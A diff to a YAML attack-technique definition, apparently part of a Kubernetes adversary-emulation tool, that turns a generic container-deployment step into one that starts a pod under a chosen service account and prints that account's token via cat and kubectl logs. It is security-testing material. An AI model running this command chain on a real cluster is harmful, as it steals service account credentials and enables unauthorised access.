@@ -1,7 +1,7 @@
-name: Deploy Container
-description: Deploy a container into an environment to facilitate execution or evade defenses
+name: Deploy Container and Mount SA Token
+description: Deploy a new ephemeral container, which mounts the service account token of the given name and prints it to stdout
 tactic: Execution
-techniques: ["Deploy Container"]
+techniques: ["Deploy Container", "Steal Application Access Token"]
 parameters:
   Name:
     type: string
@@ -17,42 +17,30 @@ parameters:
     description: the image used by the workload
   Command:
     type: string
-    default: sleep infinity
+    default: /bin/sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
     description: the command executed when starting the container
   ServiceAccount:
     type: string
     default: ""
     required: false
     description: the service account used by the workload
-  Privileged:
-    type: bool
-    description: is the container is running in privileged mode
-  HostIPC:
-    type: bool
-    description: is the IPC namespace shared with the host
-  HostPID:
-    type: bool
-    description: is the PID namespace shared with the host
-  HostNetwork:
-    type: bool
-    description: is the network shared with the host
-  Identity:
-    type: string
-    description: the identity used to deploy the container
-  NodeName:
-    type: string
-    description: the name of the node where the pod should be deployed
 cmdVariants:
   - key: kubectl
-    command: kubectl run ${NAME} --image=${IMAGE} --field-manager=Ran --restart=Never  --command -- ${COMMAND}
+    command: >
+      kubectl run ${NAME} --image=${IMAGE} -q --field-manager=Ran --restart=Never --overrides='{ "spec": { "serviceAccountName": "${SERVICEACCOUNT}" } }' --command -- ${COMMAND}  
+      && kubectl wait --for=jsonpath='{.status.containerStatuses[*].state.terminated}' pod/${NAME} --timeout=5s 
+      && kubectl logs ${NAME}
 preconditions:
   accessLevel: "can-create"
 effects:
   - Pod($p)
   - Namespace($ns)
   - ns.contains($p)
-parser: newContainer
+parser: rawServiceaccountToken
 defend: {}
+cleanup:
+  - command: kubectl delete pod ${NAME}
+    description: Delete the pod after execution
 references:
   - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/New%20Container/
   - https://kubenomicon.com/Execution/New_container.html
